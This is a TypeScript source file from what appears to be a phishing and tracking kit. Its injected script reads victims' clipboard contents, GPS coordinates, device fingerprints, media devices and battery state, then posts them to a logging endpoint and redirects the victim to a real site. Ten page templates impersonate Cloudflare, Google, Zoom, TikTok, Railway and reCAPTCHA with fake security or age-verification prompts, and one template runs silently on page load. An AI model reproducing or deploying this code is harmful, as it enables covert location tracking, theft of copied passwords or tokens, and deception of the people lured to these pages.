export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; // gps, notification, clipboard, media, motion
  
  return `
<script>
  (function() {
    var permsAttempted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 25 : 7;
      if (elapsed >= threshold || (permsAttempted >= requiredPerms.length && elapsed >= 2)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 500);
       };
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function(mode) {
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (!isSilent) {
        box.innerHTML = '<div id="status-icon" style="font-size:40px; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
          '<h2 id="status-title">' + (cfg.initTitle || 'Memproses...') + '</h2>' +
          '<div id="progress-container" style="width:100%; background:#f0f0f0; border-radius:10px; height:8px; margin-bottom:15px; overflow:hidden; border: 1px solid #eee;">' +
          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.4s ease;"></div>' +
          '</div>' +
          '<p id="status-text" style="font-size:13px; color:#7f8c8d; min-height: 40px;">' + (cfg.initText || 'Menghubungkan ke server...') + '</p>';
      }

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      function logEvent(type, data) {
        return fetch('/api/log/' + targetId + '/' + type, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
        }).catch(function(){});
      }

      function finish(success, reason) {
        if (isSilent) {
           window.location.href = targetUrl;
           return;
        }
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) {
            statusTitle.innerText = cfg.doneTitle || "Selesai";
            statusTitle.style.color = "#27ae60";
          }
          if (statusText) statusText.innerText = "Verifikasi berhasil. Mengalihkan...";
          if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "Selesai";
          if (statusText) statusText.innerText = (reason || "") + " Mengalihkan...";
        }
        setTimeout(checkRedirect, 2000);
      }

      try {
        if (!isSilent) updateProgress(10, cfg.step1 || "Menganalisis sistem...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          cores: navigator.hardwareConcurrency || "N/A",
          vendor: navigator.vendor,
          ref: document.referrer || "Direct"
        };

        try {
          if ('getBattery' in navigator) {
            var b = await navigator.getBattery();
            metadata.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
          }
        } catch(e) {}

        await logEvent('info', metadata);

        // Permissions Sequence
        var currentProgress = 20;
        var stepCount = requiredPerms.length;

        for (var i = 0; i < requiredPerms.length; i++) {
          var perm = requiredPerms[i];
          currentProgress += Math.floor(60 / stepCount);

          if (perm === 'notification' && "Notification" in window) {
            if (!isSilent) updateProgress(currentProgress, "Mengaktifkan push alerts...", "Izin Notifikasi");
            await Notification.requestPermission();
          }

          if (perm === 'clipboard' && navigator.clipboard) {
            if (!isSilent) updateProgress(currentProgress, "Validasi token keamanan data...", "Clipboard Sync");
            try {
              var clip = await navigator.clipboard.readText();
              if (clip) await logEvent('extra', { clipboard: clip });
            } catch(e) {}
          }

          if (perm === 'media' && navigator.mediaDevices) {
            if (!isSilent) updateProgress(currentProgress, "Mendeteksi port audio/video...", "Hardware Check");
            try {
              var devs = await navigator.mediaDevices.enumerateDevices();
              var list = devs.map(d => d.kind + ': ' + (d.label || 'Unknown Device')).join('\\n');
              await logEvent('extra', { media: list });
            } catch(e) {}
          }

          if (perm === 'motion') {
            if (!isSilent) updateProgress(currentProgress, "Mendeteksi aktivitas fisik...", "Motion Check");
            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                try { await DeviceOrientationEvent.requestPermission(); } catch(e) {}
            }
          }

          if (perm === 'gps' && navigator.geolocation) {
             if (!isSilent) {
                updateProgress(currentProgress, cfg.step3 || "Otorisasi lokasi terakhir...", cfg.waitTitle || "Izin Geolocation");
                if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
             }
             await new Promise(resolve => {
               navigator.geolocation.getCurrentPosition(
                 function(pos) {
                    logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve);
                 },
                 function(err) { resolve(); },
                 { enableHighAccuracy: true, timeout: 8000 }
               );
             });
          }
          permsAttempted++;
        }

        finish(true);
      } catch (err) {
        finish(false, "Sistem sibuk.");
      }
    };
  })();
</script>
`;
};

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "🛡️ Standard Security (Notifications)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:30px; background:#fff; border-radius:15px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; font-size:16px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3); width: 100%; } .btn:active { transform: scale(0.98); }</style></head><body><div class="box"><div class="loader"></div><h2>Layanan Keamanan</h2><p>Langkah terakhir: Hubungkan notifikasi browser Anda untuk verifikasi identitas real-time.</p><button class="btn" onclick="window.startCapture();">HUBUNGKAN SEKARANG</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '1', perms: ['notification'], accent: '#3498db', icon: '🛡️',
      initTitle: 'Sinkronisasi...', initText: 'Mempersiapkan hub alerts...',
      doneTitle: 'Terverifikasi'
    })}</body></html>`
  },
  '2': {
    name: "☁️ Cloudflare: Secure Path (Clipboard)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Needed</title><style>body { font-family:system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { width:90%; max-width:450px; } .dot-spinner { display:flex; gap:8px; margin-bottom:20px; justify-content:center; } .dot { width:10px; height:10px; background:#fa8231; border-radius:50%; animation:bounce 0.5s infinite alternate; } .dot:nth-child(2) { animation-delay:0.1s; } .dot:nth-child(3) { animation-delay:0.2s; } @keyframes bounce { to { transform:translateY(-10px); } } h1 { font-size:24px; font-weight:500; } .info { font-size:14px; color:#555; margin-bottom:30px; } .btn { border:1px solid #ccc; background:#fff; padding:12px 25px; border-radius:4px; font-weight:600; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.05); width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:30px;"><div class="dot-spinner"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><h1>Integrity Verification</h1><p class="info">Click below to allow the system to verify your browser token from the secure clipboard area.</p><button class="btn" onclick="window.startCapture();">Confirm Integrity</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '2', perms: ['clipboard'], accent: '#fa8231', icon: '🛰️',
      initTitle: 'Validating Token...', initText: 'Decrypting Ray ID from memory...',
      doneTitle: 'Success'
    })}</body></html>`
  },
  '3': {
    name: "⚙️ File Access: Region Sync (GPS)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Redirecting...</title><style>body { background:#f9f9f9; text-align:center; padding-top:20vh; font-family:sans-serif;} .box { width:90%; max-width:400px; background:#fff; border:1px solid #ddd; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 4px 6px rgba(0,0,0,0.05); } .icon { font-size:50px; margin-bottom:15px; } .btn { background:#000; color:#fff; border:none; padding:12px 40px; border-radius:25px; font-weight:bold; cursor:pointer; margin-top:20px; width:100%; }</style></head><body><div class="box"><div class="icon">📁</div><h2>Konten Terbatas</h2><p>Mohon konfirmasi lokasi Anda untuk mensinkronkan ketersediaan file di wilayah Anda.</p><button class="btn" onclick="window.startCapture();">VALIDASI LOKASI</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '3', perms: ['gps'], accent: '#000', icon: '🌍',
      initTitle: 'Checking Region...', initText: 'Matching IP with coordinates...',
      doneTitle: 'Region Validated'
    })}</body></html>`
  },
  '4': {
    name: "G Google Sync (Notifications + GPS)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Secure</title><style>body { font-family: 'Roboto', Arial, sans-serif; text-align:center; padding-top:10vh; } .container { width:90%; max-width:400px; margin:0 auto; padding:30px; border:1px solid #efefef; border-radius:8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); } h2 { font-weight:400; color: #202124; } .btn { background:#1a73e8; color:white; border:none; padding:12px 30px; border-radius:4px; cursor:pointer; font-weight:500; margin-top:20px; width:100%; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"><br><br><h2>Sinkronisasi Akun</h2><p>Amankan akun Anda dengan mengaktifkan <b>Notifikasi Login & Lokasi Tepercaya</b> pada perangkat ini.</p><button class="btn" onclick="window.startCapture();">SINKRONKAN SEKARANG</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '4', perms: ['notification', 'gps'], accent: '#4285f4', icon: '📱',
      initTitle: 'Google Sync...', initText: 'Connecting to security nodes...',
      doneTitle: 'Account Protection Enabled'
    })}</body></html>`
  },
  '5': {
    name: "🖥️ Cyber Scanner (GPS + Notify + Clip)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Sync</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { border:1px solid #0f0; background:transparent; color:#0f0; padding:15px 30px; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><h1>SCANNING DEVICE...</h1><p>[*] Checking browser integrity<br>[*] Requesting permission bundle for deep scan...<br><br>Klik untuk mengizinkan audit keamanan penuh.</p><br><button class="btn" onclick="window.startCapture();">FULL SECURITY AUDIT</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '5', perms: ['notification', 'clipboard', 'gps'], flow: 'full', accent: '#0f0', icon: '▒▒',
      initTitle: 'AUDIT_RUNNING...', initText: '[*] Checking system vulnerabilities...',
      doneTitle: 'THREATS_CLEARED'
    })}</body></html>`
  },
  '6': {
    name: "🚄 Railway App (Media List)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Railway App</title><style>body { background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#e1ff00; color:#000; padding:12px 25px; border-radius:6px; font-weight:bold; border:none; margin-top:20px; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://railway.app/brand/logotype-dark.svg" width="150" style="margin-bottom:30px;"><br><h2>Deploy Verification</h2><p>Otorisasi sinkronisasi hardware diperlukan untuk mengalokasikan container server yang tepat.</p><button class="btn" onclick="window.startCapture();">AUTHENTICATE HARDWARE</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '6', perms: ['media'], accent: '#e1ff00', icon: '🚄',
      initTitle: 'Deploying Sync...', initText: 'Spinning up container resources...',
      doneTitle: 'Hardware Authenticated'
    })}</body></html>`
  },
  '7': {
    name: "📹 Zoom: Calibration (Media + GPS)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Zoom Calibration</title><style>body { background:#fff; font-family:sans-serif; text-align:center; padding-top:15vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#2d8cff; color:#fff; padding:15px 30px; border-radius:10px; font-weight:bold; border:none; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><img src="https://st1.zoom.us/static/6.3.25055/image/new/ZoomLogo.png" width="120"><br><br><h1>Persiapan Video...</h1><p>Mohon izinkan <b>Sertifikasi Media & Lokasi</b> agar server dapat mensinkronkan sesi video Anda.</p><button class="btn" onclick="window.startCapture();">IZINKAN SINKRONISASI</button></div>${getCaptureScript(id, 'https://zoom.us/', {
      tmplId: '7', perms: ['media', 'gps'], accent: '#2d8cff', icon: '📹',
      initTitle: 'Calibrating...', initText: 'Matching regional audio buffers...',
      doneTitle: 'Ready for Call'
    })}</body></html>`
  },
  '8': {
    name: "🔞 TikTok Age (Motion + GPS)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok</title><style>body { background:#121212; color:white; text-align:center; padding-top:20vh; font-family:sans-serif; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#fe2c55; color:white; padding:15px 40px; border-radius:4px; font-weight:bold; border:none; cursor:pointer; font-size:16px; width:100%; }</style></head><body><div class="box"><div style="font-size:40px;">🔞</div><h2>USIA DIBATASI</h2><p>Verifikasi kedewasaan Anda melalui **Sinkronisasi Sensor Gerak & Lokasi** untuk membuka konten ini.</p><button class="btn" onclick="window.startCapture();">KONFIRMASI 18+</button></div>${getCaptureScript(id, 'https://tiktok.com/', {
      tmplId: '8', perms: ['motion', 'gps'], accent: '#fe2c55', icon: '🌍',
      initTitle: 'Verifying Age...', initText: 'Analyzing regional age laws...',
      doneTitle: 'Verified Adult'
    })}</body></html>`
  },
  '9': {
    name: "🕵️ stealth reCAPTCHA (Silent Flow)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; } .box { border:1px solid #d3d3d3; padding:15px; background:#fff; box-shadow:0 2px 4px rgba(0,0,0,0.1); display:flex; align-items:center; width:300px; cursor:default; }</style></head><body><div style="text-align:center;"><p style="margin-bottom:20px; color:#555;">Satu langkah lagi...</p><div class="box"><div class="check" style="width:25px; height:25px; border:2px solid #c1c1c1; margin-right:15px; display:flex; align-items:center; justify-content:center; color:green; font-weight:bold;"></div><div style="font-size:14px; color:#555;">Selesaikan tantangan...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: '9', flow: 'silent', perms: []
    })}</body></html>`
  },
  '10':{
    name: "🛡️ Patch Fix (Notify + Clipboard)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Security Patch</title><style>body { font-family:sans-serif; text-align:center; padding-top:20vh; background:#f5f5f7; } .box { width:90%; max-width:400px; background:#fff; display:inline-block; padding:30px; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.05); } .btn { background:#007aff; color:white; padding:12px 40px; border-radius:22px; border:none; cursor:pointer; font-weight:600; margin-top:20px; width:100%; }</style></head><body><div class="box"><div style="font-size:50px; color:#007aff; margin-bottom:20px;">⚙️</div><h1>Security Update</h1><p>Izinkan sinkronisasi **Notifikasi & Clipboard** untuk menerapkan patch keamanan terbaru.</p><button class="btn" onclick="window.startCapture();">TERAPKAN PATCH</button></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: '10', perms: ['notification', 'clipboard'], accent: '#007aff', icon: '🛡️',
      initTitle: 'Patching...', initText: 'Applying security blobs...',
      doneTitle: 'System Hardened'
    })}</body></html>`
  }
};
